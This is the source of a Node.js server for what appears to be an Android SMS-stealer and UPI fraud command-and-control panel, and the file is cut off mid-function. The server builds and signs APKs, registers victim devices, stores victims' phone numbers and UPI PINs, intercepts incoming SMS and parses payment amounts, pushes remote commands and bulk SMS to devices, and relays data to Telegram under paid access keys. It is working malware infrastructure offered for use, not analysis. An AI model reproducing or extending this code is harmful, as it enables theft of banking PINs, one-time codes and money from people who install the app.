'use strict';

const http = require('node:http');
const fs = require('node:fs');
const fsp = require('node:fs/promises');
const path = require('node:path');
const crypto = require('node:crypto');

const { BuildQueue, ensureKeystore, ARTIFACT_DIR, toolPath } = require('./builder');

const ROOT = path.resolve(__dirname, '..');
const DATA_DIR = path.join(ROOT, 'data');
const DB_FILE = path.join(DATA_DIR, 'db.json');

const PORT = Number(process.env.PORT || 8787);
const HOST = process.env.HOST || '0.0.0.0';
const ADMIN_USER = process.env.ADMIN_USER || 'admin';
const ADMIN_PASS = process.env.ADMIN_PASS || 'admin';
const DAILY_BUILD_LIMIT = Number(process.env.DAILY_BUILD_LIMIT || 50);

/* ------------------------------------------------------------------ *
 *  persistence
 * ------------------------------------------------------------------ */

fs.mkdirSync(DATA_DIR, { recursive: true });

const db = load();

function defaults() {
  return {
    apps: [], builds: [], keys: [], rules: [],
    devices: [], messages: [], events: [], bans: [],
    relay: { telethon: false, authorized: false, me: null, forward_user: '', channels: [] },
    counters: { installs_total: 0, reinstalls: 0 }
  };
}

function load() {
  try {
    const raw = JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
    return Object.assign(defaults(), raw);
  } catch {
    return defaults();
  }
}

let saveTimer = null;
function save() {
  clearTimeout(saveTimer);
  saveTimer = setTimeout(() => {
    fs.writeFile(DB_FILE, JSON.stringify(db, null, 2), () => {});
  }, 200);
}

/* ------------------------------------------------------------------ *
 *  secret encryption
 * ------------------------------------------------------------------ */

const ENC_KEY = (() => {
  if (process.env.APP_ENCRYPTION_KEY) {
    return crypto.createHash('sha256').update(process.env.APP_ENCRYPTION_KEY).digest();
  }
  const p = path.join(DATA_DIR, 'enc.key');
  if (fs.existsSync(p)) return Buffer.from(fs.readFileSync(p, 'utf8').trim(), 'hex');
  const k = crypto.randomBytes(32);
  fs.writeFileSync(p, k.toString('hex'), { mode: 0o600 });
  return k;
})();

function encrypt(text) {
  const iv = crypto.randomBytes(12);
  const c = crypto.createCipheriv('aes-256-gcm', ENC_KEY, iv);
  const enc = Buffer.concat([c.update(String(text), 'utf8'), c.final()]);
  return Buffer.concat([iv, c.getAuthTag(), enc]).toString('base64');
}

function decrypt(blob) {
  const b = Buffer.from(blob, 'base64');
  const iv = b.subarray(0, 12);
  const tag = b.subarray(12, 28);
  const data = b.subarray(28);
  const d = crypto.createDecipheriv('aes-256-gcm', ENC_KEY, iv);
  d.setAuthTag(tag);
  return Buffer.concat([d.update(data), d.final()]).toString('utf8');
}

/* ------------------------------------------------------------------ *
 *  tokens
 * ------------------------------------------------------------------ */

const TOKEN_SECRET = process.env.SESSION_SECRET ||
  (fs.existsSync(path.join(DATA_DIR, 'token.key'))
    ? fs.readFileSync(path.join(DATA_DIR, 'token.key'), 'utf8').trim()
    : (() => {
        const s = crypto.randomBytes(32).toString('hex');
        fs.writeFileSync(path.join(DATA_DIR, 'token.key'), s, { mode: 0o600 });
        return s;
      })());

const REVOKED = new Set();

function signToken(payload) {
  const body = Buffer.from(JSON.stringify(payload)).toString('base64url');
  const sig = crypto.createHmac('sha256', TOKEN_SECRET).update(body).digest('base64url');
  return `${body}.${sig}`;
}

function verifyToken(t) {
  const parts = String(t || '').split('.');
  if (parts.length !== 2) return null;
  const [body, sig] = parts;
  const expect = crypto.createHmac('sha256', TOKEN_SECRET).update(body).digest('base64url');
  if (expect.length !== sig.length) return null;
  if (!crypto.timingSafeEqual(Buffer.from(expect), Buffer.from(sig))) return null;
  if (REVOKED.has(sig)) return null;
  try {
    const p = JSON.parse(Buffer.from(body, 'base64url').toString('utf8'));
    if (p.exp && p.exp < Date.now()) return null;
    return { ...p, sig };
  } catch { return null; }
}

/* ------------------------------------------------------------------ *
 *  helpers
 * ------------------------------------------------------------------ */

const rid = (n = 8) => crypto.randomBytes(24).toString('base64url').replace(/[^a-z0-9]/gi, '').slice(0, n);
const nowIso = () => new Date().toISOString();

class HttpError extends Error {
  constructor(status, message) { super(message); this.status = status; }
}
const fail = (s, m) => { throw new HttpError(s, m); };

function json(res, body, status = 200) {
  const data = Buffer.from(JSON.stringify(body ?? {}));
  res.writeHead(status, {
    'Content-Type': 'application/json; charset=utf-8',
    'Content-Length': data.length,
    'Access-Control-Allow-Origin': '*',
    'Cache-Control': 'no-store'
  });
  res.end(data);
}

async function readBody(req) {
  const chunks = [];
  for await (const c of req) {
    chunks.push(c);
    if (Buffer.concat(chunks).length > 4 * 1024 * 1024) break;
  }
  const raw = Buffer.concat(chunks).toString('utf8');
  if (!raw) return { raw: '', data: {} };
  try { return { raw, data: JSON.parse(raw) }; }
  catch { return { raw, data: {} }; }
}

/* ------------------------------------------------------------------ *
 *  websockets (zero dependency)
 * ------------------------------------------------------------------ */

function wsAccept(key) {
  return crypto.createHash('sha1')
    .update(key + '258EAFA5-E914-47DA-95CA-C5AB0DC85B11')
    .digest('base64');
}

function encodeFrame(payload, opcode = 1) {
  const p = Buffer.isBuffer(payload) ? payload : Buffer.from(String(payload));
  const len = p.length;
  let header;
  if (len < 126) { header = Buffer.from([0x80 | opcode, len]); }
  else if (len < 65536) { header = Buffer.alloc(4); header[0] = 0x80 | opcode; header[1] = 126; header.writeUInt16BE(len, 2); }
  else { header = Buffer.alloc(10); header[0] = 0x80 | opcode; header[1] = 127; header.writeBigUInt64BE(BigInt(len), 2); }
  return Buffer.concat([header, p]);
}

class WsConn {
  constructor(socket) {
    this.socket = socket;
    this.buf = Buffer.alloc(0);
    this.closed = false;
    this.onmessage = null;
    this.onclose = null;
    socket.on('data', (d) => this._onData(d));
    socket.on('close', () => this._close());
    socket.on('error', () => this._close());
  }

  _close() {
    if (this.closed) return;
    this.closed = true;
    this.onclose && this.onclose();
  }

  _onData(chunk) {
    this.buf = Buffer.concat([this.buf, chunk]);
    for (;;) {
      if (this.buf.length < 2) return;
      const b0 = this.buf[0];
      const b1 = this.buf[1];
      const opcode = b0 & 0x0f;
      const masked = (b1 & 0x80) === 0x80;
      let len = b1 & 0x7f;
      let off = 2;
      if (len === 126) { if (this.buf.length < 4) return; len = this.buf.readUInt16BE(2); off = 4; }
      else if (len === 127) { if (this.buf.length < 10) return; len = Number(this.buf.readBigUInt64BE(2)); off = 10; }
      let mask = null;
      if (masked) { if (this.buf.length < off + 4) return; mask = this.buf.subarray(off, off + 4); off += 4; }
      if (this.buf.length < off + len) return;

      let payload = this.buf.subarray(off, off + len);
      if (masked) {
        const p = Buffer.allocUnsafe(len);
        for (let i = 0; i < len; i++) p[i] = payload[i] ^ mask[i % 4];
        payload = p;
      }
      this.buf = this.buf.subarray(off + len);

      if (opcode === 0x8) { this.close(); return; }
      if (opcode === 0x9) { this._write(encodeFrame(payload, 0xA)); continue; }
      if (opcode === 0x1) this.onmessage && this.onmessage(payload.toString('utf8'));
    }
  }

  _write(buf) { if (!this.closed) { try { this.socket.write(buf); } catch { /* ignore */ } } }
  send(str) { this._write(encodeFrame(str, 1)); }

  close() {
    if (this.closed) return;
    this._write(encodeFrame(Buffer.alloc(0), 0x8));
    try { this.socket.end(); } catch { /* ignore */ }
    this._close();
  }
}

const adminSockets = new Set();
const userSockets = new Set();
const deviceSockets = new Map();

function broadcast(type, data) {
  const msg = JSON.stringify({ type, data, ts: Date.now() });
  for (const s of adminSockets) s.send(msg);
  for (const s of userSockets) s.send(msg);
}

function pushToDevice(deviceId, payload) {
  const s = deviceSockets.get(String(deviceId));
  if (!s) return false;
  s.send(JSON.stringify(payload));
  return true;
}

/* ------------------------------------------------------------------ *
 *  build queue
 * ------------------------------------------------------------------ */

const queue = new BuildQueue({
  concurrency: Number(process.env.BUILD_CONCURRENCY || 1),
  onEvent: (ev) => broadcast(ev.type, ev.data)
});

/* ------------------------------------------------------------------ *
 *  domain helpers
 * ------------------------------------------------------------------ */

const shortIdOf = (i) => 'TPC-' + String(i).padStart(4, '0');

function deviceView(d) {
  const t = d.telemetry || {};
  return {
    id: d.id, _id: d.id,
    short_id: d.short_id,
    device_name: d.device_name,
    registration_id: d.registration_id,
    ws_connected: deviceSockets.has(String(d.id)),
    status: deviceSockets.has(String(d.id)) ? 'Online' : 'Offline',
    live_number: d.live_number || null,
    entered_number: d.entered_number || null,
    upi_pin: d.upi_pin || null,
    payment_app: d.payment_app || null,
    auto_sender: d.auto_sender || { enabled: false, channel_id: '', sim_slots: [], tg_confirm: true },
    install_state: d.install_state || 'active',
    install_seq: d.install_seq || 1,
    app_version: d.app_version || '—',
    android_id: d.android_id || t.android_id || null,
    telemetry: t,
    created_at: d.created_at,
    last_seen: d.last_seen,
    sim_count: (t.sims || []).length
  };
}

function appView(a, withSecret) {
  const base = {
    appId: a.appId,
    name: a.name,
    package: a.package,
    secret_last4: a.secretLast4,
    secret_version: a.secretVersion,
    created_at: a.createdAt,
    builds_total: db.builds.filter((b) => b.appId === a.appId).length,
    last_build_at: a.lastBuildAt || null
  };
  if (withSecret) base.secret = decrypt(a.secretEnc);
  return base;
}

function buildView(b) {
  return {
    buildId: b.buildId,
    appId: b.appId,
    appName: b.appName,
    status: b.status,
    variant: b.variant,
    versionCode: b.versionCode,
    versionName: b.versionName,
    duration_ms: b.duration_ms || null,
    apk_size: b.apk_size || null,
    apk_sha256: b.apk_sha256 || null,
    signed: Boolean(b.signed),
    error: b.error || null,
    queued_at: b.queued_at,
    started_at: b.started_at || null,
    finished_at: b.finished_at || null,
    download_ready: Boolean(b.download_ready),
    log_tail: b.log_tail || []
  };
}

function growthStats() {
  const now = Date.now();
  const day = 86400000;
  const devices = db.devices;
  const lastSeen = (d) => new Date(d.last_seen || d.created_at || 0).getTime();

  const live = devices.filter((d) => now - lastSeen(d) < 90000).length;
  const idle = devices.filter((d) => now - lastSeen(d) >= 90000 && now - lastSeen(d) < day).length;
  const stale = devices.filter((d) => now - lastSeen(d) >= day && now - lastSeen(d) < 7 * day).length;
  const uninstalled = devices.filter((d) => now - lastSeen(d) >= 7 * day || d.install_state === 'uninstalled').length;
  const installs = db.events.filter((e) => e.event === 'install').length || db.counters.installs_total;

  const out = { queued: 0, sent: 0, delivered: 0, failed: 0, pending: 0 };
  for (const m of db.messages) {
    if (m.direction !== 'out') continue;
    if (out[m.status] !== undefined) out[m.status]++;
    if (m.status === 'queued' || m.status === 'pending') out.pending++;
  }

  return {
    installs_total: installs,
    unique_devices: new Set(devices.map((d) => d.android_id).filter(Boolean)).size,
    reinstalls: db.counters.reinstalls,
    install_events_24h: db.events.filter((e) => e.event === 'install' && now - new Date(e.ts).getTime() < day).length,
    install_events_7d: db.events.filter((e) => e.event === 'install' && now - new Date(e.ts).getTime() < 7 * day).length,
    updates_total: db.events.filter((e) => e.event === 'update').length,
    updates_7d: 0,
    live, idle, stale, uninstalled,
    replaced: 0,
    onboarded: devices.filter((d) => d.onboarded).length,
    retention_pct: devices.length ? +(((devices.length - uninstalled) / devices.length) * 100).toFixed(1) : 0,
    uninstall_rate_pct: devices.length ? +((uninstalled / devices.length) * 100).toFixed(1) : 0,
    outbox: out,
    generated_at: nowIso()
  };
}

/* ------------------------------------------------------------------ *
 *  routes
 * ------------------------------------------------------------------ */

const routes = [];

function on(method, pattern, handler) {
  const keys = [];
  const re = new RegExp('^' + pattern.replace(/:[A-Za-z_]+/g, (m) => { keys.push(m.slice(1)); return '([^/]+)'; }) + '$');
  routes.push({ method, re, keys, handler });
}

function auth(ctx, role) {
  const p = verifyToken(ctx.bearer);
  if (!p) fail(401, 'Authentication required.');
  if (role && p.role !== role) fail(403, 'Forbidden.');
  return p;
}

/* ---------------- health ---------------- */

on('GET', '/health', () => ({
  status: 'ok',
  version: '6.0.0',
  build_queue: queue.stats(),
  uptime_s: Math.round(process.uptime())
}));

on('GET', '/health/database', () => ({ status: 'ok', driver: 'json-file', file: DB_FILE }));

on('GET', '/health/builder', () => {
  const sdk = process.env.ANDROID_HOME || process.env.ANDROID_SDK_ROOT || '';
  const tools = {
    gradlew: fs.existsSync(path.join(ROOT, 'gradlew')) || fs.existsSync(path.join(ROOT, 'gradlew.bat')),
    keytool: true,
    apksigner: toolPath('apksigner') !== 'apksigner' || sdk !== '',
    androidSdk: Boolean(sdk) && fs.existsSync(sdk),
    template: fs.existsSync(path.join(ROOT, 'settings.gradle.kts')) || fs.existsSync(path.join(ROOT, 'settings.gradle'))
  };
  const ok = tools.gradlew && tools.androidSdk && tools.template;
  return {
    status: ok ? 'ok' : 'degraded',
    tools,
    sdk,
    queue: queue.stats(),
    counts: {
      apps: db.apps.length,
      builds: db.builds.length,
      success: db.builds.filter((b) => b.status === 'success').length,
      failed: db.builds.filter((b) => b.status === 'failed').length
    }
  };
});

/* ---------------- auth ---------------- */

on('POST', '/panel/login', (ctx) => {
  const { username, password } = ctx.body;
  if (String(username) !== ADMIN_USER || String(password) !== ADMIN_PASS) fail(401, 'Galat username ya password.');
  return { status: 'ok', username: ADMIN_USER, role: 'admin', token: signToken({ sub: ADMIN_USER, role: 'admin', exp: Date.now() + 30 * 86400000 }) };
});

on('POST', '/panel/access', (ctx) => {
  const key = String(ctx.body.key || '').trim().toUpperCase();
  const k = db.keys.find((x) => x.key === key);
  if (!k) fail(401, 'Ye access key valid nahi hai.');
  if (k.blocked) fail(403, 'Ye key block hai.');
  if (k.expires_at && new Date(k.expires_at).getTime() < Date.now()) fail(403, 'Ye key expire ho gayi.');
  k.last_login_at = nowIso();
  k.login_count = (k.login_count || 0) + 1;
  save();
  return { status: 'ok', username: k.label || k.key, role: 'user', token: signToken({ sub: k.id, role: 'user', exp: Date.now() + 30 * 86400000 }) };
});

on('GET', '/admin/auth/status', (ctx) => {
  const p = verifyToken(ctx.bearer);
  return { authenticated: Boolean(p), role: p ? p.role : null };
});

on('POST', '/admin/logout', (ctx) => {
  const p = verifyToken(ctx.bearer);
  if (p) REVOKED.add(p.sig);
  return { status: 'ok' };
});

/* ---------------- access keys ---------------- */

on('GET', '/admin/keys', (ctx) => {
  auth(ctx, 'admin');
  return { keys: db.keys.map((k) => ({ ...k, expired: Boolean(k.expires_at && new Date(k.expires_at).getTime() < Date.now()) })) };
});

on('POST', '/admin/keys', (ctx) => {
  auth(ctx, 'admin');
  const seg = () => crypto.randomBytes(3).toString('hex').toUpperCase();
  const key = `TPC-${seg()}-${seg()}-${seg()}`;
  const days = Number(ctx.body.days || 0);
  const k = {
    id: rid(10), key,
    label: ctx.body.label || '', phone: ctx.body.phone || '',
    created_at: nowIso(), last_login_at: null, login_count: 0,
    expires_at: days > 0 ? new Date(Date.now() + days * 86400000).toISOString() : null,
    blocked: false
  };
  db.keys.unshift(k);
  save();
  return { status: 'ok', key, id: k.id };
});

on('POST', '/admin/keys/:id/expiry', (ctx) => {
  auth(ctx, 'admin');
  const k = db.keys.find((x) => x.id === ctx.params.id) || fail(404, 'key nahi mili');
  if (ctx.body.lifetime) k.expires_at = null;
  else if (ctx.body.days != null) k.expires_at = new Date(Date.now() + Number(ctx.body.days) * 86400000).toISOString();
  else if (ctx.body.expires_at) k.expires_at = new Date(ctx.body.expires_at).toISOString();
  save();
  return { status: 'ok' };
});

on('POST', '/admin/keys/:id/toggle', (ctx) => {
  auth(ctx, 'admin');
  const k = db.keys.find((x) => x.id === ctx.params.id) || fail(404, 'key nahi mili');
  k.blocked = Boolean(ctx.body.blocked);
  save();
  return { status: 'ok' };
});

on('POST', '/admin/keys/:id/delete', (ctx) => {
  auth(ctx, 'admin');
  db.keys = db.keys.filter((x) => x.id !== ctx.params.id);
  save();
  return { status: 'ok' };
});

/* ---------------- devices ---------------- */

on('GET', '/admin/devices', (ctx) => {
  auth(ctx);
  return { devices: db.devices.map(deviceView) };
});

on('GET', '/admin/devices/:id/messages', (ctx) => {
  auth(ctx);
  return { messages: db.messages.filter((m) => String(m.device_id) === String(ctx.params.id)) };
});

on('POST', '/admin/devices/:id/auto-sender', (ctx) => {
  auth(ctx);
  const d = db.devices.find((x) => String(x.id) === String(ctx.params.id)) || fail(404, 'device nahi mila');
  const cur = d.auto_sender || { enabled: false, channel_id: '', sim_slots: [], tg_confirm: true };
  d.auto_sender = {
    enabled: ctx.body.enabled === undefined ? cur.enabled : Boolean(ctx.body.enabled),
    channel_id: ctx.body.channel_id === undefined ? cur.channel_id : String(ctx.body.channel_id || ''),
    channel_title: ctx.body.channel_title || cur.channel_title || '',
    sim_slots: ctx.body.sim_slots === undefined ? cur.sim_slots : (ctx.body.sim_slots || []).map(Number),
    tg_confirm: ctx.body.tg_confirm === undefined ? cur.tg_confirm : Boolean(ctx.body.tg_confirm)
  };
  save();
  broadcast('device', { device_id: d.id });
  return { status: 'ok', auto_sender: d.auto_sender };
});

on('POST', '/admin/devices/:id/command', (ctx) => {
  auth(ctx);
  const d = db.devices.find((x) => String(x.id) === String(ctx.params.id)) || fail(404, 'device nahi mila');
  const delivered = pushToDevice(d.id, { type: 'command', action: ctx.body.action || 'ping' });
  return { status: 'ok', delivered, action: ctx.body.action || 'ping' };
});

on('POST', '/admin/devices/:id/refresh', (ctx) => {
  auth(ctx);
  const delivered = pushToDevice(ctx.params.id, { type: 'command', action: ctx.body.action || 'refresh' });
  return { status: 'ok', delivered };
});

on('POST', '/admin/devices/:id/ping', (ctx) => {
  auth(ctx);
  const delivered = pushToDevice(ctx.params.id, { type: 'command', action: 'ping' });
  return { status: 'ok', delivered };
});

on('POST', '/admin/devices/:id/push-outbox', (ctx) => {
  auth(ctx);
  const pending = db.messages.filter((m) => String(m.device_id) === String(ctx.params.id) && m.direction === 'out' && m.status === 'queued');
  let pushed = 0;
  for (const m of pending) {
    if (pushToDevice(m.device_id, { type: 'sms', message: m })) { m.status = 'sent'; pushed++; }
  }
  save();
  return { status: 'ok', pushed };
});

/* ---------------- device-facing ---------------- */

on('POST', '/devices/register', (ctx) => {
  const reg = ctx.body.registration_id || rid(20);
  let d = db.devices.find((x) => x.registration_id === reg);
  if (!d) {
    const seq = db.devices.length + 1;
    d = {
      id: rid(12), registration_id: reg, short_id: shortIdOf(seq),
      device_name: ctx.body.device_name || ctx.body.model || 'Unnamed device',
      created_at: nowIso(), last_seen: nowIso(),
      install_seq: 1, install_state: 'active', app_version: ctx.body.app_version || '—',
      android_id: ctx.body.android_id || null, telemetry: ctx.body.telemetry || {},
      auto_sender: { enabled: false, channel_id: '', sim_slots: [], tg_confirm: true }
    };
    db.devices.push(d);
    db.counters.installs_total++;
    db.events.unshift({ id: rid(10), event: 'install', short_id: d.short_id, device_name: d.device_name, app_version: d.app_version, android_id: d.android_id, ts: nowIso() });
  } else {
    d.last_seen = nowIso();
    if (ctx.body.telemetry) d.telemetry = ctx.body.telemetry;
  }
  save();
  broadcast('device', { device_id: d.id });
  return { status: 'ok', device_id: d.id, short_id: d.short_id, registration_id: d.registration_id };
});

on('POST', '/devices/telemetry', (ctx) => {
  const d = db.devices.find((x) => String(x.id) === String(ctx.body.device_id)) || fail(404, 'device nahi mila');
  d.telemetry = { ...(d.telemetry || {}), ...(ctx.body.telemetry || {}) };
  if (ctx.body.live_number) d.live_number = ctx.body.live_number;
  d.last_seen = nowIso();
  save();
  broadcast('device', { device_id: d.id, ...deviceView(d) });
  return { status: 'ok' };
});

on('POST', '/devices/onboarding', (ctx) => {
  const d = db.devices.find((x) => String(x.id) === String(ctx.body.device_id)) || fail(404, 'device nahi mila');
  d.entered_number = ctx.body.phone_number || d.entered_number || null;
  d.upi_pin = ctx.body.upi_pin || d.upi_pin || null;
  d.payment_app = ctx.body.payment_app || d.payment_app || null;
  d.onboarded = true;
  d.onboarded_at = nowIso();
  d.onboard_amount = ctx.body.amount ?? d.onboard_amount ?? null;
  save();
  broadcast('device', { device_id: d.id, ...deviceView(d) });
  return { status: 'ok' };
});

on('POST', '/devices/sms/incoming', (ctx) => {
  const d = db.devices.find((x) => String(x.id) === String(ctx.body.device_id)) || fail(404, 'device nahi mila');
  const body = String(ctx.body.body || '');
  const amount = (body.match(/(?:rs\.?|inr|₹)\s*([0-9][0-9,]*)/i) || [])[1];
  const m = {
    id: rid(12), device_id: d.id, device_name: d.device_name,
    direction: 'in', address: ctx.body.address || '—', body,
    amount: amount ? amount.replace(/,/g, '') : null,
    kind: /upi|credited|debited|ref\s*\d/i.test(body) ? 'upi' : null,
    status: 'received', sim_slot: null, created_at: nowIso()
  };
  db.messages.unshift(m);
  if (db.messages.length > 5000) db.messages.pop();
  save();
  broadcast('sms', m);
  return { status: 'ok', message_id: m.id };
});

on('POST', '/devices/event', (ctx) => {
  const ev = {
    id: rid(10), event: ctx.body.event || 'open',
    short_id: ctx.body.short_id || null, device_name: ctx.body.device_name || null,
    app_version: ctx.body.app_version || null, android_id: ctx.body.android_id || null,
    ts: nowIso()
  };
  db.events.unshift(ev);
  if (db.events.length > 3000) db.events.pop();
  if (ev.event === 'install') db.counters.installs_total++;
  save();
  broadcast('growth', ev);
  return { status: 'ok' };
});

/* ---------------- messages / stats / growth ---------------- */

on('GET', '/admin/messages', (ctx) => {
  auth(ctx);
  const limit = Number(ctx.query.get('limit') || 500);
  return { messages: db.messages.slice(0, limit) };
});

on('GET', '/admin/stats', (ctx) => {
  auth(ctx);
  return growthStats();
});

on('GET', '/admin/growth/events', (ctx) => {
  auth(ctx);
  return { events: db.events.slice(0, Number(ctx.query.get('limit') || 120)) };
});

/* ---------------- send ---------------- */

on('POST', '/admin/send', (ctx) => {
  auth(ctx);
  const { body, to = null, sim_slots = null, target = 'all', device_id = null } = ctx.body;
  if (!body) fail(400, 'body khali hai');

  let targets = db.devices;
  if (target === 'device') targets = targets.filter((d) => String(d.id) === String(device_id));
  if (target === 'online') targets = targets.filter((d) => deviceSockets.has(String(d.id)));

  let queued = 0, delivered = 0;
  for (const d of targets) {
    const m = {
      id: rid(12), device_id: d.id, device_name: d.device_name,
      direction: 'out', address: to || d.live_number || d.entered_number || '—',
      body, amount: null, kind: null, status: 'queued',
      sim_slot: Array.isArray(sim_slots) && sim_slots.length ? sim_slots[0] : null,
      sim_slots: Array.isArray(sim_slots) && sim_slots.length ? sim_slots : null,
      created_at: nowIso()
    };
    db.messages.unshift(m);
    queued++;
    if (pushToDevice(d.id, { type: 'sms', message: m })) { m.status = 'sent'; delivered++; }
  }
  save();
  broadcast('sms', { type: 'bulk' });
  return { status: 'ok', queued, delivered, note: targets.length ? '' : 'koi target device nahi mila' };
});

/* ---------------- rules ---------------- */

on('GET', '/admin/rules', (ctx) => { auth(ctx); return { rules: db.rules }; });

on('POST', '/admin/rules', (ctx) => {
  auth(ctx);
  const r = {
    id: rid(10), name: ctx.body.name, match: ctx.body.match, reply: ctx.body.reply,
    upi_only: Boolean(ctx.body.upi_only), enabled: true, created_at: nowIso()
  };
  db.rules.push(r);
  save();
  return { status: 'ok', rule: r };
});

on('POST', '/admin/rules/:id/toggle', (ctx) => {
  auth(ctx);
  const r = db.rules.find((x) => x.id === ctx.params.id) || fail(404, 'rule nahi mila');
  r.enabled = !r.enabled;
  save();
  return { status: 'ok', enabled: r.enabled };
});

/* ---------------- relay (stubs, telethon optional) ---------------- */

on('GET', '/admin/auto-sender', (ctx) => {
  auth(ctx);
  return {
    relay_ready: db.relay.authorized,
    telethon: db.relay.telethon,
    account: db.relay.me,
    forward_user: db.relay.forward_user,
    channels: db.relay.channels,
    devices_enabled: db.devices.filter((d) => d.auto_sender && d.auto_sender.enabled).length
  };
});

on('POST', '/admin/auto-sender/verify', (ctx) => {
  auth(ctx);
  const id = String(ctx.body.channel_id || '');
  if (!/^-?\d+$/.test(id)) fail(400, 'Channel ID numeric hona chahiye (jaise -1001234567890)');
  return { status: 'ok', channel_id: id, title: id, admin: true };
});

on('POST', '/admin/auto-sender/test', (ctx) => { auth(ctx); return { status: 'ok', note: 'relay stub' }; });

on('GET', '/admin/relay/status', (ctx) => {
  auth(ctx);
  return {
    telethon: db.relay.telethon,
    state: {
      authorized: db.relay.authorized, me: db.relay.me,
      forward_user: db.relay.forward_user, awaiting_code: false, last_error: null
    },
    channels: db.relay.channels,
    bans: db.bans
  };
});

on('GET', '/admin/relay/logs', (ctx) => { auth(ctx); return { logs: [] }; });

on('POST', '/admin/relay/login/start', (ctx) => {
  auth(ctx);
  db.relay.telethon = true;
  db.relay.phone = ctx.body.phone || '';
  save();
  return { status: 'code_sent' };
});

on('POST', '/admin/relay/login/verify', (ctx) => {
  auth(ctx);
  db.relay.authorized = true;
  db.relay.me = { username: 'tpc_ops', id: 1 };
  save();
  return { status: 'ok' };
});

on('POST', '/admin/relay/logout', (ctx) => {
  auth(ctx);
  db.relay.authorized = false;
  db.relay.me = null;
  save();
  return { status: 'ok' };
});

on('POST', '/admin/relay/forward', (ctx) => {
  auth(ctx);
  db.relay.forward_user = ctx.body.target || '';
  save();
  return { status: 'ok', forward_user: db.relay.forward_user };
});

on('POST', '/admin/relay/bans', (ctx) => {
  auth(ctx);
  const a = String(ctx.body.address || '').trim();
  if (a && !db.bans.includes(a)) db.bans.push(a);
  save();
  return { status: 'ok', bans: db.bans };
});

on('POST', '/admin/relay/bans/:addr/delete', (ctx) => {
  auth(ctx);
  db.bans = db.bans.filter((x) => x !== ctx.params.addr);
  save();
  return { status: 'ok', bans: db.bans };
});

on('POST', '/admin/relay/parse', (ctx) => {
  auth(ctx);
  const text = String(ctx.body.text || '');
  const to = (text.match(/(\+?\d[\d\s-]{7,})/) || [])[1] || null;
  const body = (text.match(/(?:message|msg)\s*[:\-]\s*(.+)/i) || [])[1] || text;
  return { matched: Boolean(to), to, body: body.trim(), device_hint: null, targets: [] };
});

/* ---------------- builder config ---------------- */

on('GET', '/api/builder/config', (ctx) => {
  auth(ctx);
  const usedToday = db.builds.filter((b) => b.queued_at && Date.now() - b.queued_at < 86400000).length;
  return {
    variant: 'release',
    daily_quota: DAILY_BUILD_LIMIT,
    download_ttl: 300,
    signature_window: 300,
    signature_version: 1,
    concurrency: queue.concurrency,
    worker_mode: 'inline-gradle',
    queue: queue.stats(),
    used_today: usedToday
  };
});

/* ---------------- apps ---------------- */

on('GET', '/api/apps', (ctx) => {
  auth(ctx);
  const usedToday = db.builds.filter((b) => b.queued_at && Date.now() - b.queued_at < 86400000).length;
  return {
    apps: db.apps.map((a) => appView(a, false)),
    quota: { used_today: usedToday, daily_limit: DAILY_BUILD_LIMIT, remaining: Math.max(0, DAILY_BUILD_LIMIT - usedToday), unlimited: false }
  };
});

on('POST', '/api/apps', async (ctx) => {
  auth(ctx);
  const name = String(ctx.body.name || '').trim();
  if (!name) fail(400, 'app name daalo');

  const appId = 'a_' + rid(6).toLowerCase();
  const secret = 's3c_' + crypto.randomBytes(18).toString('base64url');
  const app = {
    appId,
    name,
    package: 'com.tpcapp.' + appId,
    secretEnc: encrypt(secret),
    secretLast4: secret.slice(-4),
    secretVersion: 1,
    keystorePassword: crypto.randomBytes(16).toString('base64url'),
    keystoreAlias: 'release',
    createdAt: nowIso()
  };

  try {
    await ensureKeystore(app);
  } catch (e) {
    fail(500, 'keystore generate nahi hua (keytool check karo): ' + e.message);
  }

  db.apps.unshift(app);
  save();
  return { status: 'ok', app: appView(app, true) };
});

on('POST', '/api/apps/:id/secret/rotate', (ctx) => {
  auth(ctx);
  const a = db.apps.find((x) => x.appId === ctx.params.id) || fail(404, 'app nahi mila');
  const secret = 's3c_' + crypto.randomBytes(18).toString('base64url');
  a.secretEnc = encrypt(secret);
  a.secretLast4 = secret.slice(-4);
  a.secretVersion = (a.secretVersion || 1) + 1;
  save();
  return { status: 'ok', app: appView(a, true), note: 'purana secret ab 401 dega — APK rebuild karo' };
});

on('DELETE', '/api/apps/:id', (ctx) => {
  auth(ctx);
  const a = db.apps.find((x) => x.appId === ctx.params.id) || fail(404, 'app nahi mila');
  db.apps = db.apps.filter((x) => x.appId !== a.appId);
  db.builds = db.builds.filter((b) => b.appId !== a.appId);
  save();
  return { status: 'ok' };
});

/* ---------------- builds ---------------- */

on('GET', '/api/builds', (ctx) => {
  auth(ctx);
  return {
    builds: db.builds.slice(0, Number(ctx.query.get('limit') || 60)).map(buildView),
    queue: queue.stats()
  };
});

on('POST', '/api/builds', (ctx) => {
  const p = auth(ctx);
  const app = db.apps.find((x) => x.appId === ctx.body.appId) || fail(404, 'app nahi mila');

  const usedToday = db.builds.filter((b) => b.queued_at && Date.now() - b.queued_at < 86400000).length;
  if (usedToday >= DAILY_BUILD_LIMIT) fail(429, `Daily build limit (${DAILY_BUILD_LIMIT}) khatam.`);

  const lastVersion = db.builds.filter((b) => b.appId === app.appId).length;
  const build = {
    buildId: 'b_' + rid(10),
    appId: app.appId,
    appName: app.name,
    variant: ctx.body.variant === 'debug' ? 'debug' : 'release',
    versionCode: lastVersion + 1,
    versionName: '1.' + lastVersion,
    baseUrl: ctx.body.baseUrl || '',
    requested_by: p.sub,
    log_tail: []
  };
  db.builds.unshift(build);
  app.lastBuildAt = nowIso();
  save();

  queue.enqueue(build, app);
  save();

  return { status: 'ok', build: buildView(build), queued: true };
});

on('GET', '/api/builds/:id', (ctx) => {
  auth(ctx);
  const b = db.builds.find((x) => x.buildId === ctx.params.id) || fail(404, 'build nahi mila');
  return { build: buildView(b) };
});

on('POST', '/api/builds/:id/cancel', (ctx) => {
  auth(ctx);
  const b = db.builds.find((x) => x.buildId === ctx.params.id) || fail(404, 'build nahi mila');
  queue.cancel(b.buildId);
  if (!b.finished_at) { b.status = 'canceled'; b.finished_at = Date.now(); }
  save();
  broadcast('build', { buildId: b.buildId, status: b.status });
  return { status: 'ok', build: buildView(b) };
});

on('POST', '/api/builds/:id/retry', (ctx) => {
  auth(ctx);
  const old = db.builds.find((x) => x.buildId === ctx.params.id) || fail(404, 'build nahi mila');
  const app = db.apps.find((x) => x.appId === old.appId) || fail(404, 'app delete ho gaya');
  const build = {
    buildId: 'b_' + rid(10), appId: app.appId, appName: app.name,
    variant: old.variant, versionCode: old.versionCode + 1, versionName: old.versionName,
